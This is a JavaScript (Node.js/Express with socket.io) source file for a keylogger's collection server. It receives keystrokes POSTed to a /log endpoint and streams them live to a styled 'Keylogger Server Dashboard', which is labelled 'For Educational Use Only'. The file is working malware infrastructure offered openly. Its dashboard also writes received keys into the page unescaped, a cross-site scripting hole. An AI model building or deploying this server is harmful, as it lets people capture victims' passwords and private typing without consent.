const express = require("express");
const bodyParser = require("body-parser");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const PORT = 3000;

let keyLogs = [];

app.use(bodyParser.json());

// Serve the HTML page dynamically
app.get("/", (req, res) => {
    let logHTML = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Keylogger Server</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {
                    background-color: #0d1117;
                    color: #c9d1d9;
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                }
                header {
                    background-color: #161b22;
                    width: 100%;
                    padding: 20px;
                    text-align: center;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.5);
                }
                header h1 {
                    margin: 0;
                    font-size: 1.8rem;
                    color: #58a6ff;
                }
                main {
                    width: 90%;
                    max-width: 800px;
                    margin-top: 20px;
                }
                .log-container {
                    background-color: #161b22;
                    border-radius: 8px;
                    padding: 20px;
                    min-height: 200px;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.5);
                    overflow-y: auto;
                    white-space: pre-wrap;
                    font-size: 1.1rem;
                    line-height: 1.5;
                }
                footer {
                    margin-top: 20px;
                    padding: 10px;
                    font-size: 0.9rem;
                    color: #8b949e;
                }
                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(10px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                .log-entry {
                    animation: fadeIn 0.3s ease-in-out;
                    display: inline-block;
                    margin: 2px;
                    padding: 4px 8px;
                    background-color: #21262d;
                    border-radius: 5px;
                }
            </style>
            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                socket.on("updateKeys", (keys) => {
                    const logElement = document.getElementById("log");
                    logElement.innerHTML = keys.length 
                        ? keys.map(k => '<span class="log-entry">' + k + '</span>').join(" ")
                        : "<i>No keys logged yet.</i>";
                    logElement.scrollTop = logElement.scrollHeight;
                });
            </script>
        </head>
        <body>
            <header>
                <h1>🔐 Keylogger Server Dashboard</h1>
            </header>
            <main>
                <div class="log-container" id="log">
                    <i>Waiting for keys...</i>
                </div>
            </main>
            <footer>
                &copy; ${new Date().getFullYear()} Cybersecurity Lab - For Educational Use Only
            </footer>
        </body>
        </html>
    `;
    res.send(logHTML);
});


// WebSocket connection
io.on("connection", (socket) => {
    console.log("Client connected");

    // Send current key logs to the client
    socket.emit("updateKeys", keyLogs);

    // Listen for disconnection
    socket.on("disconnect", () => {
        console.log("Client disconnected");
    });
});

// Endpoint to receive key logs
app.post("/log", (req, res) => {
    const { key } = req.body;
    if (!key) return res.status(400).send("No key received.");

    keyLogs.push(key);

    // Send updated key logs to all connected clients
    io.emit("updateKeys", keyLogs);

    res.sendStatus(200);
});

// Start the server
server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
